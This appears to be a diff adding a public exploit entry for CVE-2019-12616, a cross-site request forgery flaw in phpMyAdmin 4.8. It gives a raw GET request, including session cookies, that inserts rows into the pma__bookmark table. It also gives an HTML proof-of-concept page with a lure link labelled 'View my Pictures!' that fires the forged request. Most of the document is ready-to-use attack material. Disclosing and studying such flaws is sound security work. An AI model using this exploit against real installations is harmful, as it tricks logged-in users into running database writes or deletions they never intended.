@@ -1,0 +1,42 @@
+# Exploit Title: Cross Site Request Forgery (CSRF)
+# Date: 11 June 2019
+# Exploit Author: Riemann
+# Vendor Homepage: https://www.phpmyadmin.net/
+# Software Link: https://www.phpmyadmin.net/downloads/
+# Version: 4.8
+# Tested on: UBUNTU 16.04 LTS -Installed Docker image - docker pull phpmyadmin/phpmyadmin:4.8 
+# CVE : 2019-12616
+
+# Description
+# An issue was discovered in phpMyAdmin before 4.9.0. A vulnerability was found that allows an attacker to trigger a CSRF attack against a phpMyAdmin user. The attacker can trick the user, for instance through a broken <img> tag pointing at the victim's phpMyAdmin database, and the attacker can potentially deliver a payload (such as a specific INSERT or DELETE statement) to the victim.	
+
+
+#VULNERABILITY:
+The following request which is a form submission is done using the ¨GET¨ request instead of using ¨POST
+<form method="get" action="index.php" class="disableAjax">
+
+GET http://localhost:9000/tbl_sql.php?sql_query=INSERT+INTO+%60pma__bookmark%60+(%60id%60%2C+%60dbase%60%2C+%60user%60%2C+%60label%60%2C+%60query%60)+VALUES+(DAYOFWEEK(%27%27)%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27)&show_query=1&db=phpmyadmin&table=pma__bookmark HTTP/1.1
+
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Cookie: pmaCookieVer=5; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci; pmaUser-1=%7B%22iv%22%3A%22M16ZzlA0rqF9BZ1jFsssjQ%3D%3D%22%2C%22mac%22%3A%22804941d12fceca0997e181cbcb8427d68c668240%22%2C%22payload%22%3A%22mD9juTxAYhC7lA7XPWHWOw%3D%3D%22%7D; phpMyAdmin=9bdd66557e399fc1447bf253bc2dc133
+Upgrade-Insecure-Requests: 1
+Host: localhost:9000
+
+The attacker can easily create a fake hyperlink containing the request that wants to execute on behalf the user,in this way making possible a CSRF attack due to the wrong use of HTTP method
+
+#POC
+<!doctype html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>POC CVE-2019-12616</title>
+</head>
+
+<body>
+<a href="http://localhost:9000/tbl_sql.php?sql_query=INSERT+INTO+`pma__bookmark`+(`id`%2C+`dbase`%2C+`user`%2C+`label`%2C+`query`)+VALUES+(DAYOFWEEK('')%2C+''%2C+''%2C+''%2C+'')&show_query=1&db=phpmyadmin&table=pma__bookmark">View my Pictures!</a>
+</body>
+</html>
